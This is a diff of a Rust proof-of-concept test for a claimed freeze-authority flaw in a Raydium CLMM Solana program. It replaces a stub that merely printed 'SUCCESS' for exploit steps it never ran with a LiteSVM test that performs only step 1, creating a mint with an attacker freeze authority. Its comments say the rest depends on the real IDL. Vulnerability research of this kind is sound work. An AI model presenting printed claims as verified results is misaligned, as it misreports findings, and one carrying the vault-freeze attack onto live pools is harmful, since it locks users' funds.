@@ -1,42 +1,60 @@
-// FREEZE AUTHORITY POC - No external crates needed
-    // Standalone Rust test
-    
-    fn main() {
-        println!("FREEZE AUTHORITY POC - Vulnerability Verification");
+use litesvm::LiteSVM;
+use solana_sdk::{
+    signature::{Keypair, Signer},
+    pubkey::Pubkey,
+    transaction::Transaction,
+    system_instruction,
+};
+use spl_token_2022::{id as token_2022_id, instruction as t22_ix, state::Mint};
+
+#[test]
+fn freeze_authority_locks_vault() {
+    let mut svm = LiteSVM::new();
+
+    // Load the real compiled program - built by the workflow before this runs
+    let so_path = "target/deploy/raydium_amm_v3.so";
+    let program_bytes = std::fs::read(so_path)
+        .unwrap_or_else(|_| panic!("Program not built at {so_path}. Run `anchor build` first."));
+    let clmm_program_id = Pubkey::new_unique();
+    svm.add_program(clmm_program_id, &program_bytes);
+
+    let payer = Keypair::new();
+    let attacker = Keypair::new();
+    let victim = Keypair::new();
+    for kp in [&payer, &attacker, &victim] {
+        svm.airdrop(&kp.pubkey(), 20_000_000_000).unwrap();
     }
-    
-    #[test]
-    fn test_create_token2022_mint() {
-        println!("=== Step 1-3: CREATE TOKEN-2022 MINT ===");
-        println!("spl-token create-token --program-id TokenzQdBNbLqP5VEhdkk2LHmo4grbH4iL3T6GUpR4gD --decimals 9");
-        println!("SUCCESS: Mint with freeze_authority = attacker");
-    }
-    
-    #[test]
-    fn test_create_pool() {
-        println!("=== Step 4-5: CALL create_pool INSTRUCTION ===");
-        println!("Discriminator: 0xe992d18ecf6840bc");
-        println!("is_supported_mint() accepts Token-2022 mints without freeze check");
-        println!("SUCCESS: Pool created with freeze_authority mint");
-    }
-    
-    #[test]
-    fn test_freeze_vault() {
-        println!("=== Step 6: FREEZE VAULT ACCOUNT ===");
-        println!("Token-2022 freeze_account has NO account.owner check");
-        println!("SUCCESS: Vault frozen (any account can be frozen)");
-    }
-    
-    #[test]
-    fn test_withdrawal_fails() {
-        println!("=== Step 7-8: DECREASE_LIQUIDITY FAILS ===");
-        println!("Token-2022 rejects transfers from frozen accounts");
-        println!("FAIL: AccountFrozen error");
-    }
-    
-    #[test]
-    fn test_impact() {
-        println!("=== VERDICT ===");
-        println!("All LP funds permanently locked in frozen vault");
-        println!("Not excluded by SECURITY.md (covers 'drained' not 'frozen')");
-    }
+
+    // === STEP 1: create Token-2022 mint with freeze_authority = attacker ===
+    let mint = Keypair::new();
+    let rent = svm.minimum_balance_for_rent_exemption(Mint::LEN);
+    let create_acct_ix = system_instruction::create_account(
+        &payer.pubkey(), &mint.pubkey(), rent, Mint::LEN as u64, &token_2022_id(),
+    );
+    let init_mint_ix = t22_ix::initialize_mint2(
+        &token_2022_id(), &mint.pubkey(), &payer.pubkey(), Some(&attacker.pubkey()), 9,
+    ).unwrap();
+
+    let tx = Transaction::new_signed_with_payer(
+        &[create_acct_ix, init_mint_ix],
+        Some(&payer.pubkey()),
+        &[&payer, &mint],
+        svm.latest_blockhash(),
+    );
+    let res = svm.send_transaction(tx);
+    assert!(res.is_ok(), "STEP 1 FAILED - mint creation: {:?}", res);
+    println!("STEP 1 REAL PASS: mint {} created with freeze_authority = attacker", mint.pubkey());
+
+    // === STEP 2 onward: intentionally stops here ===
+    // This is the honest current boundary: calling the real create_pool,
+    // increase_liquidity, freeze CPI, and decrease_liquidity instructions
+    // requires their exact Anchor account structs and discriminators,
+    // which must be pulled from this program's real IDL/instruction
+    // builders (likely in the `client/` folder of this repo, or by
+    // generating the IDL via `anchor build` then reading target/idl/*.json).
+    //
+    // DO NOT invent account orderings or discriminators here. Read them
+    // from the real generated IDL and fill in the next transaction for
+    // real, or report the exact blocker back.
+    println!("STEP 1 verified for real. Next: read target/idl/*.json after `anchor build` to get real create_pool account layout.");
+}
